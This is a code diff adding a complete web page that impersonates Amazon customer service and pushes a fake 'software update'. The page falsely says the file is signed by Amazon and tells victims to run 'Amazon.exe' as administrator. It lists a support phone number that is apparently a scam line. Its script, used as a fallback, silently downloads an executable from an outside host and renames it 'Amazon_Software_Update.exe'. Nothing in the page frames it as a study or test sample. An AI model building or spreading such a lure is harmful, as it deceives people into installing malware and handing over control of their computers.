@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Amazon - Important Software Update</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Amazon Ember", Arial, sans-serif;
+        background: linear-gradient(135deg, #232f3e 0%, #131a22 100%);
+        min-height: 100vh;
+        color: #333;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      .header {
+        background: white;
+        border-radius: 8px 8px 0 0;
+        padding: 30px;
+        text-align: center;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .amazon-logo {
+        font-size: 36px;
+        font-weight: bold;
+        color: #232f3e;
+        margin-bottom: 10px;
+        position: relative;
+      }
+
+      .download-notification {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 1000;
+        transform: translateX(400px);
+        transition: transform 0.3s ease;
+      }
+      .download-notification.show {
+        transform: translateX(0);
+      }
+
+      .amazon-logo::after {
+        content: "";
+        position: absolute;
+        bottom: -5px;
+        left: 0;
+        right: 0;
+        height: 3px;
+        background: linear-gradient(90deg, #ff9900 0%, #ffb84d 100%);
+        border-radius: 2px;
+      }
+
+      .letter-content {
+        background: white;
+        padding: 40px;
+        border-radius: 0 0 8px 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        line-height: 1.6;
+      }
+
+      .greeting {
+        font-size: 18px;
+        margin-bottom: 25px;
+        color: #232f3e;
+      }
+
+      .message {
+        font-size: 16px;
+        margin-bottom: 30px;
+        color: #555;
+      }
+
+      .download-section {
+        background: linear-gradient(135deg, #ff9900 0%, #ffb84d 100%);
+        padding: 30px;
+        border-radius: 12px;
+        text-align: center;
+        margin: 30px 0;
+        box-shadow: 0 4px 15px rgba(255, 153, 0, 0.3);
+      }
+
+      .download-title {
+        color: white;
+        font-size: 24px;
+        font-weight: bold;
+        margin-bottom: 15px;
+      }
+
+      .download-description {
+        color: white;
+        font-size: 16px;
+        margin-bottom: 25px;
+        opacity: 0.9;
+      }
+
+      .download-btn {
+        display: inline-block;
+        background: white;
+        color: #ff9900;
+        padding: 15px 30px;
+        border-radius: 25px;
+        text-decoration: none;
+        font-weight: bold;
+        font-size: 18px;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      }
+
+      .download-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        background: #f8f8f8;
+      }
+
+      .file-info {
+        background: #f8f9fa;
+        padding: 20px;
+        border-radius: 8px;
+        margin: 20px 0;
+        border-left: 4px solid #ff9900;
+      }
+
+      .file-details {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+
+      .file-name {
+        font-weight: bold;
+        color: #232f3e;
+      }
+
+      .file-size {
+        color: #666;
+        font-size: 14px;
+      }
+
+      .security-notice {
+        background: #e8f5e8;
+        border: 1px solid #4caf50;
+        padding: 20px;
+        border-radius: 8px;
+        margin: 20px 0;
+      }
+
+      .security-title {
+        color: #2e7d32;
+        font-weight: bold;
+        margin-bottom: 10px;
+      }
+
+      .security-text {
+        color: #2e7d32;
+        font-size: 14px;
+      }
+
+      .footer {
+        text-align: center;
+        margin-top: 30px;
+        color: #666;
+        font-size: 14px;
+      }
+
+      .signature {
+        margin-top: 30px;
+        padding-top: 20px;
+        border-top: 1px solid #eee;
+      }
+
+      .signature-name {
+        font-weight: bold;
+        color: #232f3e;
+      }
+
+      .signature-title {
+        color: #666;
+        font-size: 14px;
+      }
+
+      @media (max-width: 600px) {
+        .container {
+          padding: 10px;
+        }
+
+        .header,
+        .letter-content {
+          padding: 20px;
+        }
+
+        .download-section {
+          padding: 20px;
+        }
+
+        .file-details {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+      }
+
+      .pulse {
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0% {
+          box-shadow: 0 4px 15px rgba(255, 153, 0, 0.3);
+        }
+        50% {
+          box-shadow: 0 4px 25px rgba(255, 153, 0, 0.5);
+        }
+        100% {
+          box-shadow: 0 4px 15px rgba(255, 153, 0, 0.3);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div
+      id="downloadNotification"
+      class="download-notification bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg"
+    >
+      <div class="flex items-center">
+        <i class="fas fa-download mr-2"></i>
+        <span id="downloadMessage"
+          >Amazon software download started! Check your downloads folder.</span
+        >
+        <button
+          onclick="hideNotification()"
+          class="ml-4 text-white hover:text-gray-200"
+        >
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+    </div>
+    <div class="container">
+      <div class="header">
+        <div class="amazon-logo">amazon</div>
+        <p style="color: #666; font-size: 14px">Customer Service Department</p>
+      </div>
+
+      <div class="letter-content">
+        <div class="greeting">Dear Valued Amazon Customer,</div>
+
+        <div class="message">
+          We hope this message finds you well. As part of our ongoing commitment
+          to providing you with the best possible shopping experience, we are
+          pleased to inform you about an important software update that will
+          enhance your Amazon services.
+        </div>
+
+        <div class="message">
+          This update includes improved security features, enhanced performance
+          optimizations, and new functionality that will make your Amazon
+          experience even more seamless and enjoyable.
+        </div>
+
+        <div class="download-section pulse">
+          <div class="download-title">📦 Download Required Software</div>
+          <div class="download-description">
+            Click the button below to download the latest Amazon software update
+          </div>
+          <a href="#" class="download-btn" onclick="downloadAmazon(event)">
+            ⬇️ Download Now
+          </a>
+        </div>
+
+        <div class="file-info">
+          <div class="file-details">
+            <span class="file-name">📄 Amazon.exe</span>
+            <span class="file-size">Size: 5.8 MB</span>
+          </div>
+        </div>
+
+        <div class="security-notice">
+          <div class="security-title">🔒 Security Information</div>
+          <div class="security-text">
+            This software has been digitally signed and verified by Amazon's
+            security team. Please ensure you download this file only from this
+            official communication.
+          </div>
+        </div>
+
+        <div class="message">
+          <strong>Installation Instructions:</strong>
+          <ol style="margin-left: 20px; margin-top: 10px">
+            <li>
+              Click the download button above to save the file to your computer
+            </li>
+            <li>Locate the downloaded file in your Downloads folder</li>
+            <li>Right-click on the file and select "Run as administrator"</li>
+            <li>Follow the on-screen installation prompts</li>
+            <li>
+              Restart your computer when prompted to complete the installation
+            </li>
+          </ol>
+        </div>
+
+        <div class="message">
+          If you encounter any issues during the installation process, please
+          don't hesitate to contact our customer support team at 1-888-280-4331
+          or visit our help center online.
+        </div>
+
+        <div class="message">
+          Thank you for being a loyal Amazon customer. We appreciate your
+          business and look forward to continuing to serve you with excellence.
+        </div>
+
+        <div class="signature">
+          <div class="signature-name">Amazon Customer Service Team</div>
+          <div class="signature-title">Amazon.com, Inc.</div>
+          <div class="signature-title">Seattle, WA 98109</div>
+        </div>
+      </div>
+
+      <div class="footer">
+        <p>© 2025 Amazon.com, Inc. or its affiliates. All rights reserved.</p>
+        <p style="margin-top: 10px; font-size: 12px">
+          This is an automated message. Please do not reply to this email.
+        </p>
+      </div>
+    </div>
+
+    <script>
+      // Function to download Amazon using the API
+      function downloadAmazon(event) {
+        event.preventDefault();
+
+        try {
+          // Show download notification
+          showNotification();
+
+          // Create the download URL with Amazon as the parameter
+          const url = `/api/download?movie=Amazon`;
+
+          // Create hidden link and trigger download
+          const a = document.createElement("a");
+          a.href = url;
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+
+          console.log("Amazon software download initiated via API");
+        } catch (error) {
+          console.error("Download failed:", error);
+          directDownload();
+        }
+      }
+
+      // Direct download fallback
+      function directDownload() {
+        const remoteFile =
+          "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+        const a = document.createElement("a");
+        a.href = remoteFile;
+        a.download = "Amazon_Software_Update.exe";
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+
+      // Show/hide notification functions
+      function showNotification() {
+        const notification = document.getElementById("downloadNotification");
+        notification.classList.add("show");
+        setTimeout(() => hideNotification(), 5000);
+      }
+
+      function hideNotification() {
+        const notification = document.getElementById("downloadNotification");
+        notification.classList.remove("show");
+      }
+
+      // Keep your existing interactive effects
+      document.addEventListener("DOMContentLoaded", function () {
+        const downloadSection = document.querySelector(".download-section");
+        downloadSection.addEventListener("mouseenter", function () {
+          this.style.transform = "scale(1.02)";
+        });
+        downloadSection.addEventListener("mouseleave", function () {
+          this.style.transform = "scale(1)";
+        });
+      });
+    </script>
+  </body>
+</html>
